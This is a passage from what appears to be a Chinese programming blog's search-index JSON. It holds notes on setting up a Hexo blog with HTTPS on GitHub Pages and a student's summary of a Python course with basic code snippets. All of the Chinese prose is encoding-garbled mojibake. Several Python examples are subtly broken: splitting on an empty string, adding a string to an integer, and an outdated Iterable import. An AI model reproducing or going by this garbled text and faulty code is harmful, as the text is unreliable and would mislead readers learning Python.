è¯ä¹¦æˆ‘å´ä¸å¤ªä¼šç”¨ã€‚æŸ¥é˜…æ–‡æ¡£åï¼Œæˆ‘å‘ç°è¿™ç§ SSL è¯ä¹¦éœ€è¦æˆ‘åœ¨æœåŠ¡å™¨ç«¯ç”¨ Nginx ç”Ÿæˆ CSRï¼Œç„¶åæ‰ä¼šå—åˆ°ä¸€ä¸ªå«æœ‰ç§é’¥å’Œè¯ä¹¦çš„å‹ç¼©åŒ…ï¼Œå†æŠŠå®ƒéƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šã€‚ç„¶è€Œï¼Œæˆ‘çš„ç½‘ç«™æ‰˜ç®¡åœ¨ GitHub Pages ä¸Šï¼Œæˆ‘æ ¹æœ¬ä¸å¯èƒ½åˆ°æœåŠ¡å™¨ç«¯æ“ä½œï¼ è¿™æ ·ä¸€æ¥ï¼Œæˆ‘è§‰å¾—æˆ‘çš„å…è´¹ SSL è¯ä¹¦åº”è¯¥æ˜¯åºŸäº†ï¼ŒçœŸæ˜¯æµªè´¹å•Šã€‚çœ‹ç€ç½‘ç«™å·¦ä¸Šè§’çš„ â€œä¸å®‰å…¨â€ å­—æ ·ï¼Œæˆ‘å¼€å§‹æ€è€ƒå¦‚ä½•å‡çº§åˆ° httpsã€‚ ","date":"2019-01-11","objectID":"/hexo/:11:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"å‡çº§ https å‡ ç»æŠ˜è…¾ï¼Œæˆ‘å‘ç°æˆ‘çš„ GitHub Pages ä»“åº“çš„è®¾ç½®é‡Œï¼Œå¯ä»¥ç›´æ¥ Enforce HTTPSã€‚åœ¨æ¢åŸŸåä¹‹å‰å°±æ˜¯ httpsï¼Œæ¢äº†åŸŸåå GitHub å½“ç„¶ä¹Ÿæœ‰åŠæ³•è®¾ç½® https å•Šï¼Œé‚£æˆ‘ä¹‹å‰å¹²å˜›å»ç”³è¯· SSL è¯ä¹¦ï¼Ÿæˆ‘æ—©è¯¥æƒ³åˆ°è¿™ä¸€ç‚¹çš„ã€‚ ç„¶è€Œæˆ‘åœ¨ Namecheap ä¸Šçš„ Host Recordï¼Œå½“æ—¶è¿˜æ˜¯é”™çš„ï¼Œäºæ˜¯æ²¡æœ‰åŠæ³•å‡çº§ã€‚æŒ‰ç…§ä¸Šæ–‡æ–¹æ³•æ”¹å¯¹åï¼Œè½»è½»ä¸€å‹¾ï¼Œå°±äº«å—åˆ°äº†æ¥è‡ªä¼Ÿå¤§çš„ SSL/TLS åè®®çš„ä¿æŠ¤ã€‚ ä½†æ˜¯è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘çš„ baidushare ä¼¼ä¹ä¸æ˜¯å¾ˆæœæ°”ï¼Œç›´æ¥ç½¢å·¥äº†ã€‚æŸ¥äº†ä¸€ä¸‹å‘ç°æ˜¯å› ä¸º baidushare ä¸æ”¯æŒ httpsï¼ˆæ‹œæ‰˜ï¼Œéƒ½ 2019 å¹´äº†ï¼‰ã€‚å¥½åœ¨ä¹Ÿæœ‰è§£å†³åŠæ³•ï¼Œæ¥è‡ª è¿™ä¸ª repoã€‚ ç¼ºç‚¹å°±æ˜¯æ¯æ¬¡å¦‚æœéœ€è¦ hexo cleanï¼Œé‚£ä¹ˆå°±å¿…é¡»åœ¨ hexo g åå…ˆæŠŠ static æ–‡ä»¶å¤¹æ‹–è¿› public é‡Œï¼Œç„¶åå† hexo dã€‚ä¸è¿‡ä¹Ÿä¸ç®—éº»çƒ¦ï¼Œå› ä¸ºå¹¶ä¸æ˜¯ç»å¸¸éœ€è¦ hexo cleanã€‚ ","date":"2019-01-11","objectID":"/hexo/:12:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"2019.4.1 æ›´æ–° æ¢äº† Material X ä¸»é¢˜ï¼Œä¸»è¦æ˜¯å› ä¸º black-blue ä»£ç æ˜¾ç¤ºçš„é—®é¢˜ã€‚åˆæ˜¯ä¸€ç•ªæŠ˜è…¾ã€‚ ","date":"2019-01-11","objectID":"/hexo/:13:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"2019.5.16 æ›´æ–° æ›´æ–°äº†çš„ Material X ä¸»é¢˜ä¸­ä¸å†éœ€è¦æ‰‹åŠ¨æ£é¼“ï¼š Mathjax è¯„è®ºåŠŸèƒ½ï¼ˆç”¨ Valine ä»£æ›¿ï¼ŒGitment æ¯•ç«Ÿå·²ç»ä¸å†ç»´æŠ¤äº†ï¼‰ åˆ†äº«åŠŸèƒ½ CSS æ‰‹åŠ¨è°ƒæ•´ ç«™å†…æœç´¢åŠŸèƒ½ å‡çº§ https ååˆ†äº«åŠŸèƒ½è°ƒæ•´ è®¿é—®è®¡æ•°åŠŸèƒ½ è¿™è¯æ˜äº†ä½¿ç”¨ä¸€ä¸ªå¤„äºç§¯æç»´æŠ¤ä¸­çš„ä¸»é¢˜æ˜¯å¤šä¹ˆé‡è¦ã€‚ ","date":"2019-01-11","objectID":"/hexo/:14:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"2020.2.25 æ›´æ–° æ›´æ–°è‡³ Volantis ä¸»é¢˜ï¼Œé…ç½®ä¸Šå˜åŒ–ä¸å¤ªå¤§ã€‚ ","date":"2019-01-11","objectID":"/hexo/:15:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"2021.10.16 æ›´æ–° ä»Šå¤©åœ¨ä¿®å¤è¿‡å»çš„åšå®¢ï¼Œæ­£å¥½çœ‹åˆ°äº†ã€‚ æ›´æ–°è‡³ Icarus ä¸»é¢˜ï¼ˆå¿˜äº†ä»€ä¹ˆæ—¶å€™çš„äº‹äº†ï¼‰ï¼Œé…ç½®éå¸¸æ–¹ä¾¿çœå¿ƒã€‚ ","date":"2019-01-11","objectID":"/hexo/:16:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["å‰ç«¯"],"content":"2022.03.10 æ›´æ–° åšå®¢æ¡†æ¶è¿ç§»è‡³ Hugoï¼Œæ›´ç®€æ´æ›´æ–¹ä¾¿äº†ï¼Œè¿™ç¯‡æ–‡ç« ä¹Ÿç»ˆäºæˆä¸ºäº†å†å²ã€‚ä»”ç»†å›æƒ³ï¼Œè¿™ä¸ªåšå®¢çœŸæ­£çš„æ ¸å¿ƒåŠŸèƒ½éœ€æ±‚åªä¸è¿‡æ˜¯ï¼š èƒ½å¤Ÿé€šè¿‡ Markdown å†™ä½œå¹¶æ–¹ä¾¿åœ°ç®¡ç†æ–‡ç« ï¼ˆHugoï¼‰ èƒ½å¤Ÿæ–¹ä¾¿åœ°æ›´æ–°ç«™ç‚¹ã€å¿«é€Ÿéƒ¨ç½²ï¼ˆHugo + GitHub Pagesï¼‰ HTTPSï¼ˆGitHub Pagesï¼‰ æ–‡ç« ã€åˆ†ç±»ã€æ ‡ç­¾ï¼ˆHugoï¼‰åŠæ•°ç›®ç»Ÿè®¡ï¼ˆHugo + è‡ªå®šä¹‰ï¼‰ æœç´¢ï¼ˆalgoliaï¼‰ ä»£ç ä¸€é”®å¤åˆ¶ï¼ˆä¸»é¢˜ï¼‰ æ¸²æŸ“æ•°å­¦å…¬å¼ï¼ˆKaTeXï¼‰ banner å›¾ç‰‡ï¼ˆä¸»é¢˜ï¼‰ çµæ´»æ˜“ç”¨çš„ ToCï¼ˆä¸»é¢˜ï¼‰ å¯æ”¾å¤§çš„å›¾ç‰‡ã€å›¾ç‰‡ captionï¼ˆlightgallery.jsï¼‰ æ¬¡è¦éœ€æ±‚åˆ™æœ‰ï¼š æ¸²æŸ“ mermaidï¼ˆHugoï¼‰ è¯„è®ºç³»ç»Ÿï¼ˆValineï¼‰ æ·±è‰²æ¨¡å¼ï¼ˆä¸»é¢˜ï¼‰ ç§»åŠ¨ç«¯é€‚é… ï¼ˆä¸»é¢˜ï¼‰ å›¾ç‰‡æ‡’åŠ è½½ï¼ˆlazysizesï¼‰ å…¶ä»–åŠŸèƒ½å¹¶æ²¡æœ‰é‚£ä¹ˆéœ€è¦ã€‚ ","date":"2019-01-11","objectID":"/hexo/:17:0","tags":["Hexo"],"title":"ä¸–å¤–æ¡ƒæºï¼šHexo è¸©å‘è®°","uri":"/hexo/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"æœŸæœ«ä½œä¸šå±…ç„¶æ˜¯å†™ç»¼è¿°ã€‚ã€‚æœ‰ç‚¹æ— èŠå•Šã€‚è¿™ä¸æ˜¯ Python æ•™ç¨‹ã€‚ ","date":"2019-01-06","objectID":"/python-summary/:0:0","tags":["é¡¹ç›®","Python"],"title":"ã€ŠPython ç¼–ç¨‹æŠ€æœ¯ã€‹æœŸæœ«ä½œä¸š","uri":"/python-summary/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"å…¥é—¨ æœ¬å­¦æœŸå­¦ä¹ äº† Python è¯­è¨€ã€‚ç”±äºä¹‹å‰å·²ç»å­¦ä¹ è¿‡ C, C++, Javaï¼ˆä»¥åŠ VB, Pascal, å‰ç«¯ä¸‰ä»¶å¥—ï¼‰ç­‰è¾ƒéš¾çš„ç¼–ç¨‹è¯­è¨€ï¼ŒPython è¯­è¨€çš„å­¦ä¹ æ²¡æœ‰å¤ªå¤šæŒ‘æˆ˜æ€§ã€‚å®¹æ˜“æ³¨æ„åˆ°ï¼ŒPython è¯­è¨€æœ€å¤§çš„ç‰¹ç‚¹æ˜¯ç°æˆçš„å¯æ–¹ä¾¿è°ƒç”¨çš„åº“å¾ˆä¸°å¯Œï¼Œè¯­è¨€æœ¬èº«å¯¹äºä¸€äº›åº•å±‚æ“ä½œçš„å°è£…ä¹Ÿåšå¾—å¾ˆå¥½ï¼Œå› æ­¤å¸¸å¸¸å¯ä»¥çœ‹åˆ°æ•ˆæœç›¸åŒçš„ç¨‹åºï¼Œç”¨ Python ç¼–å†™æ¯”ç”¨ C/C++ï¼ˆä¸ç”¨æ Javaï¼‰è¦çŸ­å¾ˆå¤šã€‚ ç„¶è€Œï¼Œä»£ä»·æ˜¯æ€§èƒ½çš„å¤§å¹…é™ä½ã€‚å¥½åœ¨å¸¸ç”¨ Python å®ç°çš„ç¨‹åºä½“é‡éƒ½ä¸ä¼šå¤ªå¤§ï¼Œå› æ­¤é€Ÿåº¦çš„é—®é¢˜å¹¶ä¸çªå‡ºã€‚æ­¤å¤–ï¼ŒPython è¯­è¨€ä½œä¸ºè§£é‡Šå‹è¯­è¨€ï¼Œä¸€æ—¦å‘å¸ƒç¨‹åºå³å¼€æºã€‚ä¸è¿‡å¦‚ä»Šï¼Œè¿™ææ€•å¹¶ä¸æ˜¯ä»€ä¹ˆç¼ºç‚¹äº†ã€‚ é¦–å…ˆæˆ‘ä»¬å­¦ä¹ äº† Python3 çš„å®‰è£…ä¸é…ç½®ã€‚è¿‡ç¨‹éå¸¸ç®€å•ï¼šä»å®˜ç½‘ä¸‹è½½å®‰è£…åŒ…ï¼Œé…å¥½ç¯å¢ƒå˜é‡ååœ¨å‘½ä»¤è¡ŒéªŒè¯å³å¯ã€‚ç¼–å†™å’Œè¿è¡Œ Python ç¨‹åºä¹Ÿæå…¶ç®€å•ï¼šè¯¾ä¸Šçš„ç¬¬ä¸€ä¸ªä¾‹å­ä¾¿æ˜¯è¾“å‡º Hello World è¯­å¥ã€‚ä¸ºæ­¤ï¼Œè€å¸ˆæä¾›äº†ä¸¤ç§æ–¹æ³•ï¼Œä¸€æ˜¯ Python äº¤äº’æ¨¡å¼ä¸‹ç›´æ¥è¾“å…¥ print(â€˜Hello Worldâ€™) å¹¶å›è½¦ï¼›äºŒæ˜¯åœ¨ä¸€ä¸ªå½¢å¦‚ 1.py æ–‡ä»¶ä¸­è¾“å…¥ä¸Šè¿°è¯­å¥ï¼Œå¹¶åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ python 1.py æ¥æ‰§è¡Œã€‚ å›¾ 1 \" å›¾ 1 å›¾ 2 \" å›¾ 2 ä¸€èˆ¬æ¥è¯´ï¼Œåä¸€ç§æ–¹æ³•ä½¿ç”¨è¾ƒå¤šã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ç§°æ‰‹çš„ä»£ç ç¼–è¾‘å™¨ã€‚è€å¸ˆæ¨èæˆ‘ä»¬ä½¿ç”¨ Sublime Text å’Œ VS Codeã€‚å®é™…æ“ä½œä¸­ï¼Œæˆ‘å‘ç°å¯¹äºä½“ç§¯ç¨å¤§ä¸€ç‚¹çš„ç¨‹åºï¼ˆä¾‹å¦‚ä¸Šç™¾è¡Œï¼‰ï¼Œä½¿ç”¨ IDE æ˜¯æ›´ä¸ºæ˜æ™ºçš„é€‰æ‹©ã€‚å› æ­¤ï¼Œå¯¹äºçŸ­å°çš„ä»£ç æˆ‘æ˜¯ç”¨ VS Code æ¥ç¼–è¾‘ï¼Œè€Œè¾ƒé•¿çš„ä»£ç æˆ‘é€‰æ‹©äº†ç”¨ PyCharm ç¼–è¾‘ã€‚ åœ¨åˆšå¼€å§‹å­¦ä¹ ç¼–ç¨‹æ—¶ï¼Œæˆ‘æ›¾ä½¿ç”¨è®°äº‹æœ¬ç¼–è¾‘ä»£ç â€”â€”ä¼—æ‰€å‘¨çŸ¥ï¼Œè®°äº‹æœ¬ä¿å­˜çš„æ–‡ä»¶ä¼šè«åå…¶å¦™åœ°åœ¨å¼€å¤´åŠ ä¸Šç‰¹æ®Šå­—ç¬¦ï¼Œè¿™æ›¾ä½¿å¾—ä½œä¸ºåˆå­¦è€…çš„æˆ‘ååˆ†å›°æƒ‘ã€‚å› æ­¤ï¼Œä½¿ç”¨è®°äº‹æœ¬ï¼ˆç”šè‡³ Wordï¼‰å†™ä»£ç ç»å¯¹æ˜¯é”™è¯¯çš„é€‰æ‹©ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬è¿›å…¥äº†æ­£å¼çš„ Python è¯­æ³•çš„å­¦ä¹ ã€‚ ","date":"2019-01-06","objectID":"/python-summary/:1:0","tags":["é¡¹ç›®","Python"],"title":"ã€ŠPython ç¼–ç¨‹æŠ€æœ¯ã€‹æœŸæœ«ä½œä¸š","uri":"/python-summary/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"åŸºç¡€ç‰¹æ€§ä¸è¯­æ³•è§„åˆ™ é¦–å…ˆæ˜¯å¸¦æˆ‘ä»¬å…¥é—¨çš„è€æœ‹å‹ print() å‡½æ•°ã€‚ print('11', '22') # 11 22 print(1 + 2) # 3 print('11', end = '') print('22', end = '') # 1122 å¯ä»¥æ¥æ”¶ç”¨é€—å·éš”å¼€çš„å­—ç¬¦ä¸²ï¼Œè¿™äº›å­—ç¬¦ä¸²è¾“å‡ºæ—¶ä¸­é—´ä¼šåŠ ä¸Š 1 ä¸ªç©ºæ ¼ï¼› å¯ä»¥æ¥æ”¶æ•°å­¦è¡¨è¾¾å¼ï¼› å¯ä»¥ç”¨å‚æ•° end æŒ‡å®šå…¶ç»“å°¾å­—ç¬¦ï¼Œé»˜è®¤ä¸ºæ¢è¡Œç¬¦ï¼› ä¸è¾“å‡ºå¯¹åº”çš„æ˜¯è¾“å…¥å‡½æ•° input()ã€‚ name = input('Enter your name:') print('Hello,', name) # Enter your name: # \u003e Mercury # Hello, Mercury æ•´è¡Œè¯»å–ï¼Œè¿”å›è¯»å–åˆ°çš„å­—ç¬¦ä¸²ï¼› å¯ä»¥æ‹¥æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œè¡¨ç¤ºæç¤ºä¿¡æ¯ã€‚ è¿™ä¸¤ä¸ªå‡½æ•°ååˆ†ç®€å•ã€‚éšåè€å¸ˆä»‹ç»äº†ä¸€äº›è¯­æ³•ï¼Œä¸ C/C++ é‡å¤çš„è¯­æ³•è§„åˆ™å°†ä¸å†èµ˜è¿°ï¼š PI = 3.14 print(r'\\n\\n\\n') # (indent error) print(r'\\n\\n\\n') # \\n\\n\\n print(''' line1 line2 line3 ''') æ³¨é‡Šä»¥ # å¼€å¤´ï¼› å¼ºåˆ¶è¦æ±‚ä»£ç å—ç¼©è¿›ï¼› æ•°æ®ç±»å‹æœ‰æ•´æ•°ã€æµ®ç‚¹æ•°ã€å­—ç¬¦ä¸²ã€å¸ƒå°”ã€ç©ºç­‰ç­‰ï¼› å­—ç¬¦ä¸²ï¼šæ—¢å¯ä»¥ç”¨å•å¼•å·åˆå¯ä»¥ç”¨åŒå¼•å·æ‹¬èµ·æ¥ï¼› å­—ç¬¦ä¸²ï¼šå¼•å·å‰åŠ  r è¡¨ç¤º rawï¼Œæ—¢å–æ¶ˆè½¬ä¹‰ï¼› å­—ç¬¦ä¸²ï¼š'''â€¦''' å¯ä»¥è¡¨ç¤ºå¤šè¡Œå­—ç¬¦ä¸²ï¼› å­—ç¬¦ä¸²æ˜¯ä¸å¯å˜ç±»å‹ï¼› å¸ƒå°”ï¼šåªæœ‰ True/False ä¸¤ä¸ªå€¼ï¼Œé€»è¾‘è¿ç®— and,or,notï¼› ç©ºå€¼ï¼šNoneï¼Œå¹¶ä¸æ˜¯ 0ï¼› å˜é‡ä½¿ç”¨å‰ä¸éœ€è¦å£°æ˜ï¼Œå˜é‡ç±»å‹ä¸å›ºå®šï¼ˆåŠ¨æ€è¯­è¨€ï¼‰ï¼› æ²¡æœ‰æœºåˆ¶ä¿è¯å¸¸é‡ä¸è¢«ä¿®æ”¹ï¼› / æ˜¯æµ®ç‚¹é™¤æ³•ã€// æ˜¯æ•´é™¤ï¼› ** è¡¨ç¤ºä¹˜æ–¹ï¼› æ•´æ•°ã€æµ®ç‚¹æ•°æ²¡æœ‰èŒƒå›´é™åˆ¶ï¼Œæµ®ç‚¹æ•°è¶…å‡ºä¸€å®šèŒƒå›´ä¼šæ˜¾ç¤º infã€‚ ç„¶åæ˜¯ä¸€äº›å¸¸ç”¨å‡½æ•°ï¼š ord('A') # 65 chr(66) # B s = 'H e l l o' len(s) # 5 s.encode('utf-8') lst = s.split('') # ['H', 'e', 'l', 'l', 'o'] ','.join(lst) # 'H,e,l,l,o' print('{name}does {thing}'.format(name='s.b.', thing='s.th.')) # s.b does s.th. print('%sdoes it %dtimes' % ('s.b.', 6)) # s.b. does it 6 times ord() å­—ç¬¦å˜æ•´æ•°ç¼–ç ï¼Œchr() æ•´æ•°ç¼–ç å˜å­—ç¬¦ï¼› bytes ç±»å‹åœ¨å¼•å·å‰åŠ  bï¼Œstr è½¬ bytes ç”¨ encode() æ–¹æ³•ï¼Œå¦‚ s.encode('utf-8')ï¼Œdecode() åä¹‹ã€‚ len() æ¥æ”¶ä¸€ä¸ªåºåˆ—ï¼ˆåˆ—è¡¨ã€å…ƒç»„ã€å­—ç¬¦ä¸²ç­‰ï¼‰å‚æ•°ï¼Œè¿”å›å…¶é•¿åº¦ï¼› æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼šå­—ç¬¦ä¸²å†…å’Œ C è¯­è¨€ä¸€æ ·ï¼Œåæ¥ % (å€¼ 0, å€¼ 1, å€¼ 2â€¦)ï¼›æˆ–ç”¨ '{0}ï¼š{1:.2f}'.format('abc', 0.254)ï¼Œè¾“å‡ºä¸º abcï¼š0.25ã€‚å¤§æ‹¬å·ä¸­çš„æ•°å­—å¹¶ä¸æ˜¯å¿…é¡»çš„ï¼› å­—ç¬¦ä¸². split(' ') ç”¨ç©ºæ ¼åˆ†å‰²å­—ç¬¦ä¸²å½¢æˆåˆ—è¡¨ï¼›','.join(åˆ—è¡¨) ç”¨é€—å·è¿æ¥åˆ—è¡¨å½¢æˆå­—ç¬¦ä¸²ï¼› å…³äºæ§åˆ¶æµï¼š for i in range(5): print(i) else: print('Done') # 0 # 1 # 2 # 3 # 4 # Done while True: print('Reached') break else: print('Not reached') print('Done') # Reached # Done æ¡ä»¶ä¸¤è¾¹éƒ½ä¸ç”¨æ‹¬å·ï¼Œä½†å³è¾¹è¦å†’å·ï¼Œä¸‹é¢çš„è¯­å¥å—éœ€è¦ç¼©è¿›ï¼› if-\u003eelif-\u003eelseï¼› while-\u003eelseï¼ˆelse æœ‰å¿…è¦å—ï¼Ÿï¼‰ï¼› for-\u003eelseï¼› for i in range(a, b)ï¼Œå·¦é—­å³å¼€ï¼Œrange ç¬¬ä¸‰ä¸ªå‚æ•°è¡¨ç¤ºæ­¥é•¿ï¼› break ä¼šè·³è¿‡å¾ªç¯çš„ elseï¼› å‡½æ•°ä¸æ¨¡å—ï¼š def func(a, b=5, c=10): print('a is', a, 'and b is', b, 'and c is', c) func(3, 7) # a is 3 and b is 7 and c is 10 func(25, c=24) # a is 25 and b is 5 and c is 24 func(c=50, a=100) # a is 100 and b is 5 and c is 50 def add_end(L=[]): L.append('END') return L add_end([1, 2, 3]) # [1, 2, 3,'END'] add_end() # ['END'] add_end() # ['END','END'] def calc(*numbers): sum = 0 for n in numbers: sum = sum + n * n return sum calc(1, 2, 3) # 14 calc() # 0 from math import sqrt sqrt(9) # 3 def å®šä¹‰å‡½æ•°ï¼› global å£°æ˜å…¨å±€å˜é‡ï¼› é»˜è®¤å‚æ•°å¿…é¡»æŒ‡å‘ä¸å¯å˜å¯¹è±¡ï¼› å…³é”®å­—å‚æ•°ï¼šè°ƒç”¨å‡½æ•°æ—¶ï¼Œå‚æ•°åˆ—è¡¨ä¸­ç”¨å‚æ•°å = å€¼çš„æ–¹å¼æŒ‡å®šéƒ¨åˆ†å‚æ•°çš„å€¼ï¼› å¯å˜å‚æ•°ï¼š*arg è¡¨ç¤ºå…ƒç»„ï¼Œ**arg è¡¨ç¤ºå­—å…¸ï¼Œå¯ç›´æ¥ä¼ å‚ï¼› å¯ä»¥è¿”å›å¤šä¸ªè¿”å›å€¼ï¼Œå®é™…ä¸Šæ˜¯è¿”å›å…ƒç»„ï¼› ä»£ç é‡ç”¨ï¼šimport åº“ï¼›from åº“ import â€¦ï¼› dir() è¿”å›å½“å‰æ¨¡å—çš„åç§°åˆ—è¡¨ï¼Œæˆ–ç»™å®šå‚æ•°æ¨¡å—çš„åç§°åˆ—è¡¨ï¼› ç‹¬ç«‹è¿è¡Œæ¨¡å—æ—¶ï¼Œ__name__==â€™__main__â€™ï¼› æ•°æ®ç»“æ„ï¼š lst = ['a', 'b', 'c'] len(lst) # 3 lst.append('d') # ['a', 'b', 'c', 'd'] lst.insert(1,'e') # ['a','e','b','c','d'] lst.sort() # ['a','b','c','d','e'] lst.pop(1) # ['a', 'b', 'c', 'd'] lst[0] = 11 # [11,'b','c','d'] tup = (2) # 2 tup = (2,) # (2,) d = {'a': 97, 'b': 98, 'c': 99} d['b'] == 98 # True d['c'] = 100 # {'a': 97, 'b': 98, 'c': 100} 'cc' in d # False d.get('bb', -1) # -1 d.pop('c') # {'a': 97, 'b': 98} s = set([1, 1, 2, 2, 3, 3]) s.add(4) # {1, 2, 3, 4} s1 = set([1, 2, 3]) s1.remove(1) # {2, 3} s \u0026 s1 # {2, 3} 'abcdefg'[::2] # 'aceg' 'abcdefg'[1:-1] # 'bcdef' åˆ—è¡¨ï¼š[] æ‹¬èµ·æ¥ï¼Œå¯å˜ï¼Œå¯ä»¥ç´¢å¼•ï¼Œå¯ä»¥ç”¨ len() å–é•¿åº¦; åˆ—è¡¨ï¼šappend() è¿½åŠ å…ƒç´ ï¼ˆæ¥è‡ªå‚æ•°ï¼‰ï¼› åˆ—è¡¨ï¼šinsert(i, s) åœ¨ç´¢å¼• i å¤„æ’å…¥å…ƒç´  sï¼› åˆ—è¡¨ï¼špop() åˆ é™¤æœ«å°¾å…ƒç´ ï¼Œæˆ–æ¥æ”¶å‚æ•° i åˆ é™¤ç´¢å¼•ä¸º i çš„å…ƒç´ ï¼› åˆ—è¡¨ï¼šå…ƒç´ ç±»å‹å¯ä»¥äº’ä¸ç›¸åŒï¼› å…ƒç»„ï¼š( ) æ‹¬èµ·æ¥ï¼Œä¸å¯å˜ï¼Œå¯ä»¥ç´¢å¼•ï¼› å…ƒç»„ï¼šåªæœ‰ä¸€ä¸ªå…ƒç´  1 çš„å…ƒç»„ï¼š(1,) è€Œä¸æ˜¯ (1)ï¼› å­—å…¸ï¼š{} æ‹¬èµ·æ¥ï¼Œ{key0: value0, key1: value1} å½¢å¼ï¼Œé”®å€¼å¿…é¡»æ˜¯ä¸å¯å˜å¯¹è±¡ï¼› å­—å…¸ï¼š å­—å…¸å˜é‡ [é”®] æ¥å¾—åˆ°å¯¹åº”çš„å€¼ï¼Œæˆ–ç”¨ å­—å…¸å˜é‡. get(é”®) å¾—åˆ°ï¼Œget() çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ²¡æ‰¾åˆ°æ—¶çš„è¿”å›å€¼ï¼Œé»˜è®¤ä¸º Noneï¼› å­—å…¸ï¼šåˆ é™¤é”®å€¼å¯¹ï¼š å­—å…¸å˜é‡. pop(é”®)ï¼› é›†åˆï¼šç”¨ä¸€ä¸ªåˆ—è¡¨åˆå§‹åŒ–ï¼Œæ— é‡å¤å…ƒç´ ï¼Œadd() æ·»åŠ å…ƒç´ ï¼Œremove() åˆ é™¤å…ƒç´ ï¼› é›†åˆï¼šå…ƒç´ å¿…é¡»æ˜¯ä¸å¯å˜å¯¹è±¡ï¼› åºåˆ—ï¼šå¦‚åˆ—è¡¨ã€å…ƒç»„ã€å­—ç¬¦ä¸²ï¼Œä¸»è¦åŠŸèƒ½æ˜¯ in åˆ¤æ–­å’Œåˆ‡ç‰‡ï¼› åˆ‡ç‰‡ï¼š[-2] å€’æ•°ç¬¬ 2 ä¸ªï¼›[2:] ç¬¬ 2 ä¸ªåˆ°æœ€åï¼›æœ‰å†’å·æ—¶å·¦é—­å³å¼€ï¼›ç¬¬ 2 ä¸ªå†’å·åæ˜¯æ­¥é•¿ã€‚ éšåçš„è¯¾ç¨‹å†…å®¹åŒ…æ‹¬äº†ä¸€éƒ¨åˆ† Python é«˜çº§ç‰¹æ€§ï¼ŒåŒ…æ‹¬è¿­ä»£å™¨ã€ç”Ÿæˆå™¨ã€å¼‚å¸¸å¤„ç†ã€é¢å‘å¯¹è±¡ç¼–ç¨‹ã€åŒ¿åå‡½æ•°ç­‰ç­‰ã€‚ ","date":"2019-01-06","objectID":"/python-summary/:2:0","tags":["é¡¹ç›®","Python"],"title":"ã€ŠPython ç¼–ç¨‹æŠ€æœ¯ã€‹æœŸæœ«ä½œä¸š","uri":"/python-summary/"},{"categories":["ç¼–ç¨‹è¯­è¨€"],"content":"é«˜çº§ç‰¹æ€§ä¸ OOP é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ç†è§£è¿­ä»£çš„æ¦‚å¿µï¼šæ‰€è°“è¿­ä»£ï¼Œå³ç”¨å¾ªç¯æ¥éå†å¯è¿­ä»£å¯¹è±¡ã€‚åˆ¤æ–­å¯¹è±¡æ˜¯å¦å¯è¿­ä»£ï¼š from collections import Iterable isinstance('123', Iterable) # True isinstance(123, Iterable) # False è¿­ä»£çš„ä¸€èˆ¬å½¢å¼æ˜¯ for å˜é‡ in å¯è¿­ä»£å¯¹è±¡:ï¼Œä¾‹å¦‚ï¼š d = {'a': 97, 'b': 98, 'c': 99} for key, val in d.items(): print(key +'='+ val) # b = 98 # a = 97 # c = 99 (unordered) # Or instead: [key +'='+ val for key, val in d.items()] # ['b=98', 'a=97', 'c=99'] ä¸Šé¢çš„ç¬¬äºŒç§æ–¹æ³•ç”¨åˆ°äº†åˆ—è¡¨ç”Ÿæˆå¼ï¼Œå®ƒè¿˜å¯ä»¥è¿™æ ·ç”¨ï¼Œæ¥æŠŠåˆ—è¡¨ä¸­çš„å­—ç¬¦ä¸²å…¨éƒ¨å˜æˆå°å†™ï¼š L = ['RESTful', 'LaTeX', 'GitHub', 'iPhone'] [s.lower() for s in L] # ['restful', 'latex', 'github', 'iphone'] å¯ä»¥æƒ³åˆ°ï¼Œåœ¨ç”Ÿæˆæ–¹æ³•å·²çŸ¥çš„æƒ…å†µä¸‹ï¼Œç›´æ¥æ±‚å‡ºæ•´ä¸ªåˆ—è¡¨å¸¸å¸¸æ˜¯æ²¡æœ‰å¿…è¦çš„ã€‚ä¸ºäº†è¾¹å¾ªç¯è¾¹è®¡ç®—ï¼ŒPython æä¾›äº†ç”Ÿæˆå™¨å¯¹è±¡ï¼š g = (s.lower() for s in L) next(g) # 'restful' next(g) # 'latex' # Generate Fibonacci sequence(less than 2000) def fib(): prev, curr = 0, 1 while True: yield curr prev, curr = curr, curr + prev f = fib() for i in f: if i \u003e 2000: break print(i) ç”Ÿæˆå™¨å¯¹è±¡å¯ä»¥ç”¨ next() æ¥ç”Ÿæˆä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œä½†ç”±äºå®ƒæ˜¯å¯è¿­ä»£çš„ï¼Œæˆ‘ä»¬é€šå¸¸ä¹ æƒ¯ç”¨å¾ªç¯æ¥éå†å…¶å…ƒç´ ã€‚æ­¤å¤–ï¼Œåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œfib() å¹¶ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè€Œæ˜¯ä¸€ä¸ªç”Ÿæˆå™¨ï¼Œå› ä¸ºå…¶å®šä¹‰ä¸­å¸¦æœ‰ yield å…³é”®å­—ã€‚ 